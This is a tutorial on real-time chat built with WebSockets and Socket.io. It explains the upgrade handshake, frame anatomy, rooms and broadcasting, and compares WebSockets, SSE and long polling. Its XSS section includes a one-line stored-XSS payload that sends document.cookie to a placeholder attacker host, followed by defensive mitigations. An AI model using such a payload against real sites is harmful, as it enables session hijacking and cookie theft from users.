# S06 Chat Rooms — Core Concepts

## The WebSocket Protocol Handshake

WebSocket is not a standalone protocol—it begins as a normal HTTP request and is "upgraded" via the Upgrade mechanism defined in RFC 6455.

### Step-by-Step Handshake

1. **Client Request**
```http
GET /socket.io/?EIO=4&transport=websocket HTTP/1.1
Host: localhost:3000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

2. **Server Response**
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

3. **Protocol Switch**
After the `101` response, the TCP socket remains open but the framing changes from HTTP request/response to WebSocket frames. Both sides can now send **frames** (text, binary, ping, pong, close) at any time without re-establishing TCP.

### Why This Matters
- The handshake reuses port 80/443, bypassing most corporate firewalls.
- `Sec-WebSocket-Key` + `Sec-WebSocket-Accept` proves the server understands the WebSocket protocol (prevents accidental upgrades by HTTP caches or proxies).
- Once upgraded, headers are gone—there is no built-in authentication session after the handshake unless you send a token in the initial HTTP cookies or query parameters.

## WebSocket Frame Anatomy (Simplified)
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - -+
```
- **FIN**: Is this the final fragment?
- **Opcode**: `0x1` = text, `0x2` = binary, `0x8` = close, `0x9` = ping, `0xA` = pong
- **MASK**: Client-to-server frames MUST be masked (XOR with 32-bit key) to prevent cache poisoning attacks.

## Socket.io Rooms and Broadcasting

### What Is a Room?
A room is an ephemeral broadcast channel within a Socket.io namespace. Sockets `join()` and `leave()` rooms dynamically.

```typescript
socket.join('engineering');
socket.to('engineering').emit('message', 'hello'); // sends to all in room except sender
io.to('engineering').emit('message', 'hello');     // sends to all including sender
```

### Broadcasting Patterns
| Pattern | Method | Use Case |
|---------|--------|----------|
| Broadcast to room except sender | `socket.to(room).emit(...)` | Normal chat message |
| Broadcast to room including sender | `io.to(room).emit(...)` | Server announcement |
| Broadcast to all sockets | `io.emit(...)` | Global notification |
| Broadcast to all except sender | `socket.broadcast.emit(...)` | Status update |

### Presence Tracking
The project implements a custom `Map<string, Set<string>>` to track socket IDs per room. This allows emitting "user joined/left" notifications. Production systems often use a "presence set" stored in Redis with TTL heartbeats.

## XSS in Chat Messages
Because chat messages are rendered as HTML in the browser, unsanitized user input is a **Stored XSS** vector:
```html
<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
```

**Mitigations**:
1. **Output encoding**: Escape `<`, `>`, `&`, `"` before injecting into DOM (`textContent` instead of `innerHTML`).
2. **Content Security Policy (CSP)**: `script-src 'self'` prevents inline script execution even if injection occurs.
3. **Input validation**: Reject messages over a length limit or containing known dangerous patterns (defense in depth).

## Trade-off: WebSockets vs. SSE vs. Long Polling

| Dimension | WebSockets (Socket.io) | SSE | Long Polling |
|-----------|------------------------|-----|--------------|
| Latency | Lowest (persistent) | Low (persistent HTTP) | High (repeated HTTP) |
| Client→Server | Native (bidirectional) | Requires separate POST | Native (each poll is a request) |
| Browser Support | Excellent (with Socket.io fallback) | Native (no IE) | Universal |
| Firewall/Proxy | Risk of WS proxy blocks | Works over HTTP/1.1 | Works everywhere |
| Overhead | Low after handshake | Very low (text/events) | High (headers per request) |
| Complexity | Medium (frames, heartbeats) | Low (HTTP stream) | Low (HTTP request loop) |

**Rule of thumb**:
- Use **WebSockets** for chat, gaming, or collaboration (bidirectional, low latency).
- Use **SSE** for stock tickers, live logs, or news feeds (one-way, simpler protocol).
- Use **Long Polling** only as a transparent fallback or in ultra-restricted legacy environments.
